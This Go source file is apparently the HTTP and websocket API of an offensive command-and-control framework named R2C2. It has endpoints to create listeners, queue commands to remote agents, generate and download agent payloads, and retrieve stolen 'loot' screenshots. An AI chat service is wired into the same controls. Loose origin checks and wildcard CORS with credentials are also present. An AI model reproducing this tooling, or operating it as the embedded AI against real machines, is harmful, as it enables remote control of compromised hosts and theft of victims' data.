package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/mati-olivera/R2C2/internal/config"
	"github.com/mati-olivera/R2C2/internal/core/agents"
	"github.com/mati-olivera/R2C2/internal/core/ai"
	_ "github.com/mati-olivera/R2C2/internal/core/ai/providers"
	"github.com/mati-olivera/R2C2/internal/core/auth"
	"github.com/mati-olivera/R2C2/internal/core/broadcaster"
	"github.com/mati-olivera/R2C2/internal/core/listeners"
	"github.com/mati-olivera/R2C2/internal/core/logger"
	"github.com/mati-olivera/R2C2/internal/core/tasks"
	"github.com/mati-olivera/R2C2/internal/database"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// TODO: split the endpoints into files

func StartServer(port int) error {

	router := gin.New()

	hub := NewHub()
	broadcaster.SetBroadcaster(hub)
	go hub.Run()

	hubWriter := &LogAdapter{Hub: hub}
	logger.AttachWebsocketWriter(hubWriter)
	logger.Info("Websocket log adapter attached")

	listenersRepo := database.InitListenersRepository(config.DB.GetInstance())
	tasksRepo := database.InitTasksRepository(config.DB.GetInstance())
	taskManager := tasks.CreateTaskManager(tasksRepo)
	sessionsRepository := database.InitSessionsRepository(config.DB.GetInstance())
	sessionsService := agents.NewSessionsService(sessionsRepository)
	agentsService := agents.NewAgentsService(sessionsRepository)
	listenersService := listeners.NewListenersService(listenersRepo, taskManager, sessionsService)

	provider, err := ai.NewProvider(config.GetConfig().AIProvider)
	if err != nil {
		logger.Error("Failed to initialize AI provider", err)
		return err
	}
	aiService := ai.NewAIService(provider, *listenersService, *taskManager, *sessionsService)

	router.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	router.Use(func(c *gin.Context) {
		if c.Request.Method == "OPTIONS" {
			c.Header("Access-Control-Allow-Origin", "*")
			c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
			c.Header("Access-Control-Allow-Headers", "Content-Type")
			c.AbortWithStatus(200)
			return
		}
		c.Next()
	})

	// TODO: check gin mode
	if gin.Mode() != gin.ReleaseMode {
		router.GET("/ping", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{
				"message": "pong",
			})
		})
	}

	db := config.DB.GetInstance()
	authRepository := database.InitOperatorsRepository(db)
	operatorsRepository := database.InitOperatorsRepository(db)
	authService := auth.NewAuthService(authRepository)

	router.POST("/auth/login", func(c *gin.Context) {
		var loginData struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}

		if err := c.BindJSON(&loginData); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
			return
		}

		token, err := authService.Login(loginData.Username, loginData.Password)
		if err != nil {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
			return
		}

		c.JSON(http.StatusOK, gin.H{"token": token})
	})

	router.GET("/ws", WebSocketAuth(config.GetConfig().JWTSecret), func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			logger.Error("Failed to set websocket upgrade", err)
			return
		}

		client := &Client{
			Hub:      hub,
			Conn:     conn,
			Username: c.GetString("username"),
			Send:     make(chan []byte, 256),
		}

		hub.Register <- client

		go client.WritePump()

		client.ReadPump()
	})

	router.GET("/listeners", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		listeners := listenersService.GetListeners()
		c.JSON(http.StatusOK, listeners)
	})

	router.POST("/listeners", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {

		var newListenerRequest listeners.NewListenerRequest
		if err := c.BindJSON(&newListenerRequest); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
			return
		}

		if newListenerRequest.Protocol == "http" {
			var httpListenerdata listeners.NewHttpListenerRequest
			err := json.Unmarshal(newListenerRequest.Data, &httpListenerdata)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid HTTP listener data"})
				return
			}
			listener, err := listenersService.CreateHttpListener(httpListenerdata)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
				return
			}

			c.JSON(http.StatusCreated, listener)
			return
		}

		c.JSON(http.StatusBadRequest, gin.H{"error": "Unsupported protocol"})
		return
	})

	router.DELETE("/listeners/:id", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		id := c.Param("id")
		err := listenersService.DeleteListener(id)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Listener deleted"})
	})

	router.POST("/tasks", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {

		var taskData tasks.QueueTaskRequest
		if err := c.BindJSON(&taskData); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
			return
		}

		result, err := taskManager.Queue(taskData.AgentId, taskData.Command, taskData.Args)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		if result != nil {
			c.JSON(http.StatusOK, result)
			return
		}

		c.JSON(http.StatusCreated, gin.H{"message": "Task queued"})
		return
	})

	router.GET("/tasks", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		tasks, err := taskManager.GetQueuedTasks()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, tasks)
	})

	router.POST("/ai/query", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {

		var aiRequest ai.QueryRequest
		if err := c.BindJSON(&aiRequest); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
			return
		}

		ctx := c.Request.Context()

		responseMessage, err := aiService.Chat(ctx, c.GetString("operator_id"), aiRequest.Message)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"message": responseMessage})
	})

	router.GET("/sessions", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		sessions, err := sessionsService.GetSessions()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, sessions)
	})

	router.POST("/agents", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		var agentData agents.NewAgentRequest
		if err := c.BindJSON(&agentData); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
			return
		}

		listener, err := listenersService.GetListenerById(agentData.Listener)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Listener not found"})
			return
		}

		address, err := listener.GetAddress()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get listener address"})
			return
		}

		agentData.Listener = address

		fileName, err := agentsService.CreateAgent(agentData)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusCreated, gin.H{"file": fileName})
	})

	router.GET("/agents/download", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		agentName := c.Query("name")

		safeFilename := filepath.Base(agentName)
		if safeFilename == "." || safeFilename == "/" {
			c.JSON(400, gin.H{"error": "Invalid filename"})
			return
		}

		filePath := filepath.Join("/tmp/payloads", safeFilename)

		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			c.JSON(404, gin.H{"error": "File not found or expired"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", safeFilename))
		c.Header("Content-Type", "application/octet-stream")
		c.Header("Content-Transfer-Encoding", "binary")

		c.File(filePath)
	})

	router.GET("/loot", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
		lootDir := config.GetConfig().LootPath
		screenshots, err := os.ReadDir(lootDir + "/screenshots")
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		loot := map[string][]string{
			"screenshots": {},
		}
		for _, file := range screenshots {
			data, err := os.ReadFile(lootDir + "/screenshots/" + file.Name())
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
				return
			}
			base64Data := base64.StdEncoding.EncodeToString(data)
			loot["screenshots"] = append(loot["screenshots"], string(base64Data))
		}
		c.JSON(http.StatusOK, loot)

	})

	sport := strconv.Itoa(port)

	return router.Run(":" + sport)
}
